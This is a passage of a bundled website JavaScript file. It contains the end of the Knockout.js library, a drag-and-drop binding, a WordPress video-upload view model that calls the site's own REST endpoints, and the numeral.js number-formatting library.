            A = [],
            C = [],
            D = [],
            F = [],
            y,
            I = 0;
          if (r) a.a.D(f, l);else {
            if (!k || t && t._countWaitingForRemove) {
              var E = a.a.Mb(t, function (a) {
                return a.Aa;
              });
              k = a.a.Pb(E, f, {
                dontLimitMoves: h.dontLimitMoves,
                sparse: !0
              });
            }
            for (var E = 0, G, H, K; G = k[E]; E++) switch (H = G.moved, K = G.index, G.status) {
              case "deleted":
                for (; u < K;) p(u++);
                H === n && (y = t[u], y.$ && (y.$.s(), y.$ = n), a.a.Ua(y.Y, e).length && (h.beforeRemove && (v.push(y), I++, y.Aa === d ? y = null : C.push(y)), y && z.push.apply(z, y.Y)));
                u++;
                break;
              case "added":
                for (; w < K;) p(u++);
                H !== n ? (A.push(v.length), p(H)) : l(G.value);
            }
            for (; w < f.length;) p(u++);
            v._countWaitingForRemove = I;
          }
          a.a.g.set(e, c, v);
          q(h.beforeMove, D);
          a.a.D(z, h.beforeRemove ? a.oa : a.removeNode);
          var M, O, P;
          try {
            P = e.ownerDocument.activeElement;
          } catch (N) {}
          if (A.length) for (; (E = A.shift()) != n;) {
            y = v[E];
            for (M = n; E;) if ((O = v[--E].Y) && O.length) {
              M = O[O.length - 1];
              break;
            }
            for (f = 0; u = y.Y[f]; M = u, f++) a.h.Wb(e, u, M);
          }
          for (E = 0; y = v[E]; E++) {
            y.Y || a.a.extend(y, b(e, g, y.Aa, m, y.pb));
            for (f = 0; u = y.Y[f]; M = u, f++) a.h.Wb(e, u, M);
            !y.Ed && m && (m(y.Aa, y.Y, y.pb), y.Ed = !0, M = y.Y[y.Y.length - 1]);
          }
          P && e.ownerDocument.activeElement != P && P.focus();
          q(h.beforeRemove, C);
          for (E = 0; E < C.length; ++E) C[E].Aa = d;
          q(h.afterMove, D);
          q(h.afterAdd, F);
        };
      })();
      a.b("utils.setDomNodeChildrenFromArrayMapping", a.a.ec);
      a.ba = function () {
        this.allowTemplateRewriting = !1;
      };
      a.ba.prototype = new a.ca();
      a.ba.prototype.constructor = a.ba;
      a.ba.prototype.renderTemplateSource = function (b, c, d, e) {
        if (c = (9 > a.a.W ? 0 : b.nodes) ? b.nodes() : null) return a.a.la(c.cloneNode(!0).childNodes);
        b = b.text();
        return a.a.ua(b, e);
      };
      a.ba.Ma = new a.ba();
      a.gc(a.ba.Ma);
      a.b("nativeTemplateEngine", a.ba);
      (function () {
        a.$a = function () {
          var a = this.Hd = function () {
            if (!v || !v.tmpl) return 0;
            try {
              if (0 <= v.tmpl.tag.tmpl.open.toString().indexOf("__")) return 2;
            } catch (a) {}
            return 1;
          }();
          this.renderTemplateSource = function (b, e, f, g) {
            g = g || w;
            f = f || {};
            if (2 > a) throw Error("Your version of jQuery.tmpl is too old. Please upgrade to jQuery.tmpl 1.0.0pre or later.");
            var h = b.data("precompiled");
            h || (h = b.text() || "", h = v.template(null, "{{ko_with $item.koBindingContext}}" + h + "{{/ko_with}}"), b.data("precompiled", h));
            b = [e.$data];
            e = v.extend({
              koBindingContext: e
            }, f.templateOptions);
            e = v.tmpl(h, b, e);
            e.appendTo(g.createElement("div"));
            v.fragments = {};
            return e;
          };
          this.createJavaScriptEvaluatorBlock = function (a) {
            return "{{ko_code ((function() { return " + a + " })()) }}";
          };
          this.addTemplate = function (a, b) {
            w.write("<script type='text/html' id='" + a + "'>" + b + "\x3c/script>");
          };
          0 < a && (v.tmpl.tag.ko_code = {
            open: "__.push($1 || '');"
          }, v.tmpl.tag.ko_with = {
            open: "with($1) {",
            close: "} "
          });
        };
        a.$a.prototype = new a.ca();
        a.$a.prototype.constructor = a.$a;
        var b = new a.$a();
        0 < b.Hd && a.gc(b);
        a.b("jqueryTmplTemplateEngine", a.$a);
      })();
    });
  })();
})();
;
// phpcs:disable WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- Not HTML
(function (root, factory) {
  if (typeof define === "function" && define.amd) {
    define("dropZone", ["knockout"], factory);
  } else if (typeof module === "object" && module.exports) {
    module.exports = factory(require("knockout"));
  } else {
    factory(ko);
  }
})(this, function (ko) {
  return ko.bindingHandlers.dropZone = {
    init: function (element, valueAccessor) {
      element.classList.add("ko-dropzone");
      function active(e) {
        element.classList.add("ko-dropzone-active");
        if (e.preventDefault) {
          e.preventDefault();
        }
        return false;
      }
      function stop(e) {
        element.classList.remove("ko-dropzone-active");
      }
      function handleDrop(e) {
        e = e || window.event;
        if (e.preventDefault) {
          e.preventDefault();
        }
        var dt = e.dataTransfer;
        var files = dt.files;
        for (var i = 0; i < files.length; i++) {
          var file = files[i];
          valueAccessor().handleDrop(file);
        }
        element.classList.remove("ko-dropzone-active");
        return false;
      }
      element.addEventListener('dragover', active);
      element.addEventListener('dragenter', active);
      element.addEventListener('dragleave', stop);
      element.addEventListener('drop', handleDrop);
      ko.utils.domNodeDisposal.addDisposeCallback(element, function () {
        element.removeEventListener('dragover', active);
        element.removeEventListener('dragenter', active);
        element.removeEventListener('dragleave', stop);
        element.removeEventListener('drop', handleDrop);
      });
    }
  };
});
function trackEvents() {
  let eventTracker = {};
  for (let i in trackedEvents) {
    document.addEventListener(trackedEvents[i], function (event) {
      eventTracker[trackedEvents[i]] = event.timeStamp;
    });
  }
  return eventTracker;
}
jQuery(function ($) {
  window.VideoViewModel = function (data, completedCallback) {
    var self = this;

    // Normalize the parameter passed to the constructor
    data = data || {};
    self.title = ko.observable(data.title);
    self.source = data.source;
    self.sourceIsURL = self.source !== 'mediaos';
    self.file = data.file;
    self.thumbnail = ko.observable(data.thumbnail);
    self.titleStatus = ko.observable('waiting');
    self.uploading = ko.observable(data.uploading);
    self.attachmentId = ko.observable('');
    self.parent = data.parent;
    self.processingStatus = ko.observable(data.processingStatus);
    self.innerError = ko.observable('');
    let submitButton = document.querySelector('.comment-submission-actions-submit input');
    self.setTitleStatus = function (state) {
      if (submitButton) {
        submitButton.disabled = false;
        submitButton.style.cursor = "pointer";
        if (state === 'edit' || window.getComputedStyle(document.querySelector('.edit-title-section')).display !== "none") {
          submitButton.disabled = true;
          submitButton.style.cursor = "not-allowed";
        }
      }
      self.titleStatus(state);
    };
    self.uploadedText = function () {
      if (self.source !== 'mediaos') {
        return BaT_Theme.txtVideoWillBeReadyWhenSubmitted;
      }
      if (self.processingStatus() === 'completed') {
        return BaT_Theme.textVideoProcessingCompleted;
      }
      return BaT_Theme.textVideoProcessing;
    };
    self.cleanInnerErrors = function () {
      self.innerError('');
      self.parent.errorSubmitting(false);
    };
    self.updateTitle = function (data = null, event) {
      self.cleanInnerErrors();
      if (self.title().trim() === '') {
        self.innerError(BaT_Theme.textAddVideoTitle);
        return false;
      }
      self.setTitleStatus('updating');
      $.ajax({
        headers: {
          'X-WP-Nonce': BaT_Theme.ajaxCreateAttachmentNonce
        },
        method: "POST",
        url: `//${window.location.hostname}/wp-json/bringatrailer/1.0/attachments/videos/${self.attachmentId()}/title`,
        data: {
          title: self.title()
        }
      }).done(function () {
        self.setTitleStatus('default');
      }).fail(function (response) {
        self.setTitleStatus('edit');
        if (response.responseJSON.data !== undefined && Array.isArray(response.responseJSON.data)) {
          for (let i = 0; i < response.responseJSON.data.length; i++) {
            self.innerError(self.innerError() + ' ' + response.responseJSON.data[i].message);
          }
        } else {
          self.innerError(response.responseJSON.message);
        }
      });
    };
    const $commentForm = $('#comments-form');
    if ($commentForm.length) {
      $commentForm.data('uploading', true);
      //hide the x button while uploading
      $('.bat-comment-videos-exit').hide();
    }
    if (self.source === 'mediaos') {
      const formData = new FormData();
      const max_chunk_size = parseInt(BaT_Theme.mmsMaxChunkSize);

      // phpcs:disable WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- Not HTML
      formData.append('video_filesize', data.file.size);
      formData.append('video_filename', data.file.name);
      formData.append('number_of_chunks', Math.ceil(data.file.size / max_chunk_size));
      // phpcs: enable

      fetch(`//${window.location.hostname}/wp-json/bringatrailer/1.0/attachments/videos/initialize_signed_upload`, {
        headers: {
          'X-WP-Nonce': BaT_Theme.ajaxCreateAttachmentNonce
        },
        method: "POST",
        body: formData
      }).then(async response => {
        const responseData = await response.json();
        if (!response.ok) {
          const error = JSON.stringify(responseData) || response.status;
          return Promise.reject(error);
        }
        return responseData;
      }).then(responseData => {
        return upload_chunks(data.file, responseData.signed_urls, responseData.signed_upload_key, max_chunk_size, BaT_Theme.textFailedUploadingVideo);
      }).then(signed_upload_key => {
        return complete_signed_upload(self.title(), signed_upload_key);
      }).then(response => {
        self.attachmentId(response.attachment_id);
        self.thumbnail(response.thumbnail);
        self.title('');
        self.setTitleStatus('edit');
        self.innerError(BaT_Theme.textAddVideoTitle);
        completedCallback({
          'status': 'success',
          'video': self
        });
      }).catch(response => {
        response = JSON.parse(response);
        let messages = [];
        if (response.data) {
          for (let i = 0; i < response.data.length; i++) {
            messages.push(response.data[i].message);
          }
        } else {
          messages.push(BaT_Theme.textFailedUploadingVideo);
        }
        completedCallback({
          'status': 'error',
          'video': self,
          messages: messages
        });
      });
    } else {
      const formData = new FormData();
      formData.append('video_url', data.file);
      $.ajax({
        headers: {
          'X-WP-Nonce': BaT_Theme.ajaxCreateAttachmentNonce
        },
        method: "POST",
        url: `//${window.location.hostname}/wp-json/bringatrailer/1.0/attachments/videos/upload_from_url`,
        contentType: false,
        processData: false,
        timeout: 0,
        data: formData
      }).done(function (response) {
        $('.bat-comment-videos-exit').show();
        if ('url' === data.source) {
          self.title(BaT_Theme.decodeHTML(response.title));
        }
        self.attachmentId(response['attachment_id']);
        self.thumbnail(response.thumbnail);
        self.setTitleStatus('default');
        completedCallback({
          'status': 'success',
          'video': self
        });
      }).fail(function (response) {
        completedCallback({
          'status': 'error',
          'video': self,
          'messages': [response.responseJSON.message]
        });
      });
    }
  };
  window.VideoUploadViewModel = function () {
    var self = this;
    self.videos = ko.observableArray([]);
    self.errors = ko.observableArray([]);
    self.errorSubmitting = ko.observable(false);
    self.showVideoUpload = ko.observable(true);
    self.isVideoUploadEnabled = 'yes' === BaT_Theme.isVideoUploadEnabled;
    self.addError = function (error_string) {
      // avoid stacking the same error message
      if (self.errors.indexOf(error_string) === -1) {
        self.errors.push(error_string);
      }
    };
    self.addVideo = function () {
      self.showVideoUpload(true);
    };
    self.dismissError = function (index) {
      self.errors.splice(index, 1);
    };
    self.fileUploader = function () {
      $("#video_file_input").click();
    };
    self.resetVideoData = function () {
      $("#uploaded_videos").val('');
      self.videos.removeAll();
      self.showVideoUpload(true);
    };
    self.uploadFromFile = function (data, e) {
      self.errors([]);
      self.handleDrop(e.target.files[0]);
      $("#video_file_input").val('');
    };
    self.uploadFromUrl = function () {
      self.errors([]);
      const video_url = $('#video_url').val().trim();
      if (!video_url.length) {
        return self.addError(BaT_Theme.textProvideVideoUrl);
      }
      self.appendVideo(BaT_Theme.textFetchingTitle, video_url, 'url');
      $('#video_url').val('');
    };
    self.handleDrop = function (file) {
      if (file === undefined) {
        return;
      }
      if (!file.type.includes('video')) {
        return self.addError(BaT_Theme.textOnlyVideosAreAllowed);
      }
      if (file.size >= BaT_Theme.mmsMaxVideoSize) {
        const size_in_gb = BaT_Theme.mmsMaxVideoSize / 1073741824;
        return self.addError(BaT_Theme.textVideoLimitSize.replacePlaceholders(size_in_gb));
      }
      self.appendVideo(file.name.replace(/\.[^/.]+$/, ""), file, 'mediaos');
    };
    self.appendVideo = function (title, file, source) {
      //decode html in title
      title = BaT_Theme.decodeHTML(title);
      if (self.videoExists(source, file)) {
        self.addError(BaT_Theme.textVideoAlreadyExists);
        return;
      }
      let id = Math.random();
      const video = new VideoViewModel({
        id,
        title,
        file,
        source,
        thumbnail: '/wp-content/themes/bringatrailer/assets/img/upload-video-loading.gif',
        uploading: true,
        parent: self,
        processingStatus: source === 'mediaos' ? 'processing' : 'completed'
      }, self.completedCallback);
      self.videos.push(video);
      self.showVideoUpload(false);
    };
    self.completedCallback = function (data) {
      if (data.status === 'error') {
        self.videos.remove(data.video);
        self.updateVideoListInput();
        for (let i = 0; i < data.messages.length; i++) {
          self.addError(data.messages[i]);
        }
        return;
      }
      if (data.status === 'success') {
        self.updateVideoListInput();
        data.video.uploading(false);
      }
      const $commentForm = $('#comments-form');
      if ($commentForm.length) {
        let video_processing = self.videos().find(videoModel => videoModel.uploading());

        //validate if any video is still processing
        if (!video_processing) {
          $commentForm.data('uploading', false);
        }
        $('.bat-comment-videos-exit').show();
        if ($commentForm.data('submitted')) {
          $commentForm.submit();
          return;
        }
        $commentForm.data('submitted', false);
        $commentForm.find('input[type="submit"]').prop('disabled', false).val(BaT_Listings_Submission.textSubmit);
      }
    };
    self.deleteVideo = function (video) {
      video.cleanInnerErrors();
      if (!confirm(BaT_Theme.textConfirmVideoDeletion)) {
        return;
      }
      $.ajax({
        headers: {
          'X-WP-Nonce': BaT_Theme.ajaxCreateAttachmentNonce
        },
        method: "POST",
        url: `//${window.location.hostname}/wp-json/bringatrailer/1.0/attachments/videos/${video.attachmentId()}/delete`
      }).done(function () {
        self.videos.remove(video);
        self.updateVideoListInput();
      }).fail(function (response) {
        if (response.responseJSON.data !== undefined && Array.isArray(response.responseJSON.data)) {
          for (let i = 0; i < response.responseJSON.data.length; i++) {
            video.innerError(video.innerError() + ' ' + response.responseJSON.data[i].message);
          }
        } else {
          video.innerError(response.responseJSON.message);
        }
      });
    };
    self.updateVideoListInput = function () {
      let video_ids = self.videos().map(videoModel => videoModel.attachmentId());
      if (video_ids.length === 0) {
        self.showVideoUpload(true);
      }
      $('#uploaded_videos').val(video_ids.join(','));
    };
    self.videoExists = function (source, file) {
      return ko.utils.arrayFirst(self.videos(), video => {
        if (source !== 'mediaos') {
          return video.file === file;
        }
        return false;
      });
    };
    BAT_WEBSERVICES_PUSHER.subscribe('videoupload');
    BAT_WEBSERVICES_PUSHER.bind(true, 'video-transcoded', function (data) {
      for (let i = 0; i < self.videos().length; i++) {
        if (self.videos()[i].attachmentId() === data.attachment_id) {
          self.videos()[i].processingStatus(data.video_data.processingStatus);
          break;
        }
      }
    });
  };
  if ($('#video-upload-section').length) {
    ko.applyBindings(new VideoUploadViewModel(), document.getElementById('video-upload-section'));
  }
});
async function complete_signed_upload(title, signed_upload_key) {
  //decode html in title
  title = BaT_Theme.decodeHTML(title);
  return new Promise((resolve, reject) => {
    const completeFormData = new FormData();
    // phpcs:disable WordPressVIPMinimum.JS.HTMLExecutingFunctions.append -- Not HTML
    completeFormData.append('signed_upload_key', signed_upload_key);
    completeFormData.append('title', title);
    // phpcs:enable

    fetch(`//${window.location.hostname}/wp-json/bringatrailer/1.0/attachments/videos/complete_signed_upload`, {
      headers: {
        'X-WP-Nonce': BaT_Theme.ajaxCreateAttachmentNonce
      },
      method: "POST",
      body: completeFormData
    }).then(async response => {
      const data = await response.json();
      if (!response.ok) {
        return reject(JSON.stringify(data));
      }
      return resolve(data);
    });
  });
}
;
/*! @preserve
 * numeral.js
 * version : 2.0.6
 * author : Adam Draper
 * license : MIT
 * http://adamwdraper.github.com/Numeral-js/
 */

(function (global, factory) {
  if (typeof define === 'function' && define.amd) {
    define(factory);
  } else if (typeof module === 'object' && module.exports) {
    module.exports = factory();
  } else {
    global.numeral = factory();
  }
})(this, function () {
  /************************************
      Variables
  ************************************/

  var numeral,
    _,
    VERSION = '2.0.6',
    formats = {},
    locales = {},
    defaults = {
      currentLocale: 'en',
      zeroFormat: null,
      nullFormat: null,
      defaultFormat: '0,0',
      scalePercentBy100: true
    },
    options = {
      currentLocale: defaults.currentLocale,
      zeroFormat: defaults.zeroFormat,
      nullFormat: defaults.nullFormat,
      defaultFormat: defaults.defaultFormat,
      scalePercentBy100: defaults.scalePercentBy100
    };

  /************************************
      Constructors
  ************************************/

  // Numeral prototype object
  function Numeral(input, number) {
    this._input = input;
    this._value = number;
  }
  numeral = function (input) {
    var value, kind, unformatFunction, regexp;
    if (numeral.isNumeral(input)) {
      value = input.value();
    } else if (input === 0 || typeof input === 'undefined') {
      value = 0;
    } else if (input === null || _.isNaN(input)) {
      value = null;
    } else if (typeof input === 'string') {
      if (options.zeroFormat && input === options.zeroFormat) {
        value = 0;
      } else if (options.nullFormat && input === options.nullFormat || !input.replace(/[^0-9]+/g, '').length) {
        value = null;
      } else {
        for (kind in formats) {
          regexp = typeof formats[kind].regexps.unformat === 'function' ? formats[kind].regexps.unformat() : formats[kind].regexps.unformat;
          if (regexp && input.match(regexp)) {
            unformatFunction = formats[kind].unformat;
            break;
          }
        }
        unformatFunction = unformatFunction || numeral._.stringToNumber;
        value = unformatFunction(input);
      }
    } else {
      value = Number(input) || null;
    }
    return new Numeral(input, value);
  };

  // version number
  numeral.version = VERSION;

  // compare numeral object
  numeral.isNumeral = function (obj) {
    return obj instanceof Numeral;
  };

  // helper functions
  numeral._ = _ = {
    // formats numbers separators, decimals places, signs, abbreviations
    numberToFormat: function (value, format, roundingFunction) {
      var locale = locales[numeral.options.currentLocale],
        negP = false,
        optDec = false,
        leadingCount = 0,
        abbr = '',
        trillion = 1000000000000,
        billion = 1000000000,
        million = 1000000,
        thousand = 1000,
        decimal = '',
        neg = false,
        abbrForce,
        // force abbreviation
        abs,
        min,
        max,
        power,
        int,
        precision,
        signed,
        thousands,
        output;

      // make sure we never format a null value
      value = value || 0;
      abs = Math.abs(value);

      // see if we should use parentheses for negative number or if we should prefix with a sign
      // if both are present we default to parentheses
      if (numeral._.includes(format, '(')) {
        negP = true;
        format = format.replace(/[\(|\)]/g, '');
      } else if (numeral._.includes(format, '+') || numeral._.includes(format, '-')) {
        signed = numeral._.includes(format, '+') ? format.indexOf('+') : value < 0 ? format.indexOf('-') : -1;
        format = format.replace(/[\+|\-]/g, '');
      }

      // see if abbreviation is wanted
      if (numeral._.includes(format, 'a')) {
        abbrForce = format.match(/a(k|m|b|t)?/);
        abbrForce = abbrForce ? abbrForce[1] : false;

        // check for space before abbreviation
        if (numeral._.includes(format, ' a')) {
          abbr = ' ';
        }
        format = format.replace(new RegExp(abbr + 'a[kmbt]?'), '');
        if (abs >= trillion && !abbrForce || abbrForce === 't') {
          // trillion
          abbr += locale.abbreviations.trillion;
          value = value / trillion;
        } else if (abs < trillion && abs >= billion && !abbrForce || abbrForce === 'b') {
          // billion
          abbr += locale.abbreviations.billion;
          value = value / billion;
        } else if (abs < billion && abs >= million && !abbrForce || abbrForce === 'm') {
          // million
          abbr += locale.abbreviations.million;
          value = value / million;
        } else if (abs < million && abs >= thousand && !abbrForce || abbrForce === 'k') {
          // thousand
          abbr += locale.abbreviations.thousand;
          value = value / thousand;
        }
      }

      // check for optional decimals
      if (numeral._.includes(format, '[.]')) {
        optDec = true;
        format = format.replace('[.]', '.');
      }

      // break number and format
      int = value.toString().split('.')[0];
      precision = format.split('.')[1];
      thousands = format.indexOf(',');
      leadingCount = (format.split('.')[0].split(',')[0].match(/0/g) || []).length;
      if (precision) {
        if (numeral._.includes(precision, '[')) {
          precision = precision.replace(']', '');
          precision = precision.split('[');
          decimal = numeral._.toFixed(value, precision[0].length + precision[1].length, roundingFunction, precision[1].length);
        } else {
          decimal = numeral._.toFixed(value, precision.length, roundingFunction);
        }
        int = decimal.split('.')[0];
        if (numeral._.includes(decimal, '.')) {
          decimal = locale.delimiters.decimal + decimal.split('.')[1];
        } else {
          decimal = '';
        }
        if (optDec && Number(decimal.slice(1)) === 0) {
          decimal = '';
        }
      } else {
        int = numeral._.toFixed(value, 0, roundingFunction);
      }

      // check abbreviation again after rounding
      if (abbr && !abbrForce && Number(int) >= 1000 && abbr !== locale.abbreviations.trillion) {
        int = String(Number(int) / 1000);
        switch (abbr) {
          case locale.abbreviations.thousand:
            abbr = locale.abbreviations.million;
            break;
          case locale.abbreviations.million:
            abbr = locale.abbreviations.billion;
            break;
          case locale.abbreviations.billion:
            abbr = locale.abbreviations.trillion;
            break;
        }
      }

      // format number
      if (numeral._.includes(int, '-')) {
        int = int.slice(1);
        neg = true;
      }
      if (int.length < leadingCount) {
        for (var i = leadingCount - int.length; i > 0; i--) {
          int = '0' + int;
        }
      }
      if (thousands > -1) {
        int = int.toString().replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1' + locale.delimiters.thousands);
      }
      if (format.indexOf('.') === 0) {
        int = '';
      }
      output = int + decimal + (abbr ? abbr : '');
      if (negP) {
        output = (negP && neg ? '(' : '') + output + (negP && neg ? ')' : '');
      } else {
        if (signed >= 0) {
          output = signed === 0 ? (neg ? '-' : '+') + output : output + (neg ? '-' : '+');
        } else if (neg) {
          output = '-' + output;
        }
      }
      return output;
    },
    // unformats numbers separators, decimals places, signs, abbreviations
    stringToNumber: function (string) {
      var locale = locales[options.currentLocale],
        stringOriginal = string,
        abbreviations = {
          thousand: 3,
          million: 6,
          billion: 9,
          trillion: 12
        },
        abbreviation,
        value,
        i,
        regexp;
      if (options.zeroFormat && string === options.zeroFormat) {
        value = 0;
      } else if (options.nullFormat && string === options.nullFormat || !string.replace(/[^0-9]+/g, '').length) {
        value = null;
      } else {
        value = 1;
        if (locale.delimiters.decimal !== '.') {
          string = string.replace(/\./g, '').replace(locale.delimiters.decimal, '.');
        }
        for (abbreviation in abbreviations) {
          regexp = new RegExp('[^a-zA-Z]' + locale.abbreviations[abbreviation] + '(?:\\)|(\\' + locale.currency.symbol + ')?(?:\\))?)?$');
          if (stringOriginal.match(regexp)) {
            value *= Math.pow(10, abbreviations[abbreviation]);
            break;
          }
        }

        // check for negative number
        value *= (string.split('-').length + Math.min(string.split('(').length - 1, string.split(')').length - 1)) % 2 ? 1 : -1;

        // remove non numbers
        string = string.replace(/[^0-9\.]+/g, '');
        value *= Number(string);
      }
      return value;
    },
    isNaN: function (value) {
      return typeof value === 'number' && isNaN(value);
    },
    includes: function (string, search) {
      return string.indexOf(search) !== -1;
    },
    insert: function (string, subString, start) {
      return string.slice(0, start) + subString + string.slice(start);
    },
    reduce: function (array, callback /*, initialValue*/) {
      if (this === null) {
        throw new TypeError('Array.prototype.reduce called on null or undefined');
      }
      if (typeof callback !== 'function') {
        throw new TypeError(callback + ' is not a function');
      }
      var t = Object(array),
        len = t.length >>> 0,
        k = 0,
        value;
      if (arguments.length === 3) {
        value = arguments[2];
      } else {
        while (k < len && !(k in t)) {
          k++;
        }
        if (k >= len) {
          throw new TypeError('Reduce of empty array with no initial value');
        }
        value = t[k++];
      }
      for (; k < len; k++) {
        if (k in t) {
          value = callback(value, t[k], k, t);
        }
      }
      return value;
    },
    /**
     * Computes the multiplier necessary to make x >= 1,
     * effectively eliminating miscalculations caused by
     * finite precision.
     */
    multiplier: function (x) {
      var parts = x.toString().split('.');
      return parts.length < 2 ? 1 : Math.pow(10, parts[1].length);
    },
    /**
     * Given a variable number of arguments, returns the maximum
     * multiplier that must be used to normalize an operation involving
     * all of them.
     */
    correctionFactor: function () {
      var args = Array.prototype.slice.call(arguments);
      return args.reduce(function (accum, next) {
        var mn = _.multiplier(next);
        return accum > mn ? accum : mn;
      }, 1);
    },
    /**
     * Implementation of toFixed() that treats floats more like decimals
     *
     * Fixes binary rounding issues (eg. (0.615).toFixed(2) === '0.61') that present
     * problems for accounting- and finance-related software.
     */
    toFixed: function (value, maxDecimals, roundingFunction, optionals) {
      var splitValue = value.toString().split('.'),
        minDecimals = maxDecimals - (optionals || 0),
        boundedPrecision,
        optionalsRegExp,
        power,
        output;

      // Use the smallest precision value possible to avoid errors from floating point representation
      if (splitValue.length === 2) {
        boundedPrecision = Math.min(Math.max(splitValue[1].length, minDecimals), maxDecimals);
      } else {
        boundedPrecision = minDecimals;
      }
      power = Math.pow(10, boundedPrecision);

      // Multiply up by precision, round accurately, then divide and use native toFixed():
      output = (roundingFunction(value + 'e+' + boundedPrecision) / power).toFixed(boundedPrecision);
      if (optionals > maxDecimals - boundedPrecision) {
        optionalsRegExp = new RegExp('\\.?0{1,' + (optionals - (maxDecimals - boundedPrecision)) + '}$');
        output = output.replace(optionalsRegExp, '');
      }
      return output;
    }
  };

  // avaliable options
  numeral.options = options;

  // avaliable formats
  numeral.formats = formats;

  // avaliable formats
  numeral.locales = locales;

  // This function sets the current locale.  If
  // no arguments are passed in, it will simply return the current global
  // locale key.
  numeral.locale = function (key) {
    if (key) {
      options.currentLocale = key.toLowerCase();
    }
    return options.currentLocale;
  };

  // This function provides access to the loaded locale data.  If
  // no arguments are passed in, it will simply return the current
  // global locale object.
  numeral.localeData = function (key) {
    if (!key) {
      return locales[options.currentLocale];
    }
    key = key.toLowerCase();
    if (!locales[key]) {
      throw new Error('Unknown locale : ' + key);
    }
    return locales[key];
  };
  numeral.reset = function () {
    for (var property in defaults) {
      options[property] = defaults[property];
    }
  };
  numeral.zeroFormat = function (format) {
    options.zeroFormat = typeof format === 'string' ? format : null;
  };
  numeral.nullFormat = function (format) {
    options.nullFormat = typeof format === 'string' ? format : null;
  };
  numeral.defaultFormat = function (format) {
    options.defaultFormat = typeof format === 'string' ? format : '0.0';
  };
  numeral.register = function (type, name, format) {
    name = name.toLowerCase();
    if (this[type + 's'][name]) {
      throw new TypeError(name + ' ' + type + ' already registered.');
    }
    this[type + 's'][name] = format;
    return format;
  };
  numeral.validate = function (val, culture) {
    var _decimalSep, _thousandSep, _currSymbol, _valArray, _abbrObj, _thousandRegEx, localeData, temp;

    //coerce val to string
    if (typeof val !== 'string') {
      val += '';
      if (console.warn) {
        console.warn('Numeral.js: Value is not string. It has been co-erced to: ', val);
      }
    }

    //trim whitespaces from either sides
    val = val.trim();

    //if val is just digits return true
    if (!!val.match(/^\d+$/)) {
      return true;
    }

    //if val is empty return false
    if (val === '') {
      return false;
    }

    //get the decimal and thousands separator from numeral.localeData
    try {
      //check if the culture is understood by numeral. if not, default it to current locale
      localeData = numeral.localeData(culture);
    } catch (e) {
      localeData = numeral.localeData(numeral.locale());
    }

    //setup the delimiters and currency symbol based on culture/locale
    _currSymbol = localeData.currency.symbol;
    _abbrObj = localeData.abbreviations;
    _decimalSep = localeData.delimiters.decimal;
    if (localeData.delimiters.thousands === '.') {
      _thousandSep = '\\.';
    } else {
      _thousandSep = localeData.delimiters.thousands;
    }

    // validating currency symbol
    temp = val.match(/^[^\d]+/);
    if (temp !== null) {
      val = val.substr(1);
      if (temp[0] !== _currSymbol) {
        return false;
      }
    }

    //validating abbreviation symbol
    temp = val.match(/[^\d]+$/);
    if (temp !== null) {
      val = val.slice(0, -1);
      if (temp[0] !== _abbrObj.thousand && temp[0] !== _abbrObj.million && temp[0] !== _abbrObj.billion && temp[0] !== _abbrObj.trillion) {
        return false;
      }
    }
    _thousandRegEx = new RegExp(_thousandSep + '{2}');
    if (!val.match(/[^\d.,]/g)) {
      _valArray = val.split(_decimalSep);
      if (_valArray.length > 2) {
        return false;
      } else {
        if (_valArray.length < 2) {
          return !!_valArray[0].match(/^\d+.*\d$/) && !_valArray[0].match(_thousandRegEx);
        } else {
          if (_valArray[0].length === 1) {
            return !!_valArray[0].match(/^\d+$/) && !_valArray[0].match(_thousandRegEx) && !!_valArray[1].match(/^\d+$/);
          } else {
            return !!_valArray[0].match(/^\d+.*\d$/) && !_valArray[0].match(_thousandRegEx) && !!_valArray[1].match(/^\d+$/);
          }
        }
      }
    }
    return false;
  };

  /************************************
      Numeral Prototype
  ************************************/

  numeral.fn = Numeral.prototype = {
    clone: function () {
      return numeral(this);
    },
    format: function (inputString, roundingFunction) {
      var value = this._value,
        format = inputString || options.defaultFormat,
        kind,
        output,
        formatFunction;

      // make sure we have a roundingFunction
      roundingFunction = roundingFunction || Math.round;

      // format based on value
      if (value === 0 && options.zeroFormat !== null) {
        output = options.zeroFormat;
      } else if (value === null && options.nullFormat !== null) {
        output = options.nullFormat;
      } else {
        for (kind in formats) {
          if (format.match(formats[kind].regexps.format)) {
            formatFunction = formats[kind].format;
            break;
          }
        }
        formatFunction = formatFunction || numeral._.numberToFormat;
        output = formatFunction(value, format, roundingFunction);
      }
      return output;
    },
    value: function () {
      return this._value;
    },
    input: function () {
      return this._input;
    },
    set: function (value) {
      this._value = Number(value);
      return this;
    },
    add: function (value) {
      var corrFactor = _.correctionFactor.call(null, this._value, value);
      function cback(accum, curr, currI, O) {
        return accum + Math.round(corrFactor * curr);
      }
      this._value = _.reduce([this._value, value], cback, 0) / corrFactor;
      return this;
    },
    subtract: function (value) {
      var corrFactor = _.correctionFactor.call(null, this._value, value);
      function cback(accum, curr, currI, O) {
        return accum - Math.round(corrFactor * curr);
      }
      this._value = _.reduce([value], cback, Math.round(this._value * corrFactor)) / corrFactor;
      return this;
    },
    multiply: function (value) {
      function cback(accum, curr, currI, O) {
        var corrFactor = _.correctionFactor(accum, curr);
        return Math.round(accum * corrFactor) * Math.round(curr * corrFactor) / Math.round(corrFactor * corrFactor);
      }
      this._value = _.reduce([this._value, value], cback, 1);
      return this;
    },
    divide: function (value) {
      function cback(accum, curr, currI, O) {
        var corrFactor = _.correctionFactor(accum, curr);
        return Math.round(accum * corrFactor) / Math.round(curr * corrFactor);
      }
      this._value = _.reduce([this._value, value], cback);
      return this;
    },
    difference: function (value) {
      return Math.abs(numeral(this._value).subtract(value).value());
    }
  };

  /************************************
      Default Locale && Format
  ************************************/

  numeral.register('locale', 'en', {
    delimiters: {
      thousands: ',',
      decimal: '.'
    },
    abbreviations: {
      thousand: 'k',
      million: 'm',
      billion: 'b',
      trillion: 't'
    },
    ordinal: function (number) {
      var b = number % 10;
      return ~~(number % 100 / 10) === 1 ? 'th' : b === 1 ? 'st' : b === 2 ? 'nd' : b === 3 ? 'rd' : 'th';
    },
    currency: {
      symbol: '$'
    }
  });
  return numeral;
});

// numeral.js format configuration
// format : currency
// author : Adam Draper : https://github.com/adamwdraper

(function (global, factory) {
  if (typeof define === 'function' && define.amd) {
    define(['../numeral'], factory);
  } else if (typeof module === 'object' && module.exports) {
    factory(require('../numeral'));
  } else {
    factory(global.numeral);
  }
